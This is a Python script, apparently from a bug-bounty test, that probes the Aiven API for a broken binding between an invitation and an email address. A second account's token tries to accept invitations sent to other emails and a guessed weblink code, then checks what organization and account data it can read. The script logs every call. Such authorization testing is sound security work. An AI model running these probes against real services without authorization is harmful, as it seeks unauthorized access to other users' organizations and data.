#!/usr/bin/env python3
"""Aiven run 6b: email-keyed invitation acceptance binding (A8)."""
import json
import os
import sys
import urllib.request
import urllib.error

BASE = "https://api.aiven.io/v1"
T1 = os.environ.get("AIVEN_TOKEN_1", "")
T2 = os.environ.get("AIVEN_TOKEN_2", "")
if not T1 or not T2:
    print("tokens missing", flush=True)
    sys.exit(2)

ORG1 = "org5eea5b7d496"
A1 = "a5eea5b45dff"
E3 = "mimi05741b+account3@bugcrowdninja.com"
E4 = "mimi05741b+account4@bugcrowdninja.com"
E2 = "mimi05741b+account2@bugcrowdninja.com"
os.makedirs("outputs", exist_ok=True)
CALLS = []


def req(method, path, token, body=None):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(
        BASE + path, data=data, method=method,
        headers={"Authorization": f"aivenv1 {token}",
                 "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"ERROR {e}"[:200]


def call(who, method, path, token, body=None, keep=1200):
    status, resp = req(method, path, token, body)
    CALLS.append({"who": who, "method": method, "path": path,
                  "status": status, "len": len(resp), "body": resp[:keep]})
    print(f"{who} {method} {path} -> {status} ({len(resp)}B)", flush=True)
    return status, resp


def membership_checks(tag):
    call("T2", "GET", f"/organization/{ORG1}/user", T2)
    call("T2", "GET", f"/organization/{ORG1}", T2)
    for suffix in ["", "/projects", "/events", "/authentication"]:
        call("T2", "GET", f"/account/{A1}{suffix}", T2)


def main():
    for email in (E3, E4):
        s, _ = call("T2", "POST", f"/organization/{ORG1}/invitation/{email}",
                    T2, {})
        if s in (200, 201, 204):
            print(f"WRONG-ACCOUNT ACCEPT SUCCEEDED for {email}", flush=True)
            membership_checks("wrong")
            break

    call("T2", "POST",
         f"/organization/{ORG1}/invitation/weblink/AAAAAAAAAAAAAAAAAAAAAA",
         T2, {})

    call("T1", "POST", f"/organization/{ORG1}/invitation",
         T1, {"user_email": E2})
    s, _ = call("T2", "POST", f"/organization/{ORG1}/invitation/{E2}", T2, {})
    print(f"legit accept -> {s}", flush=True)
    if s in (200, 201, 204):
        membership_checks("legit")

    with open("outputs/aiven_invite_probe2.json", "w") as f:
        json.dump({"calls": CALLS}, f, indent=1)
    print(f"DONE calls={len(CALLS)}", flush=True)


if __name__ == "__main__":
    main()
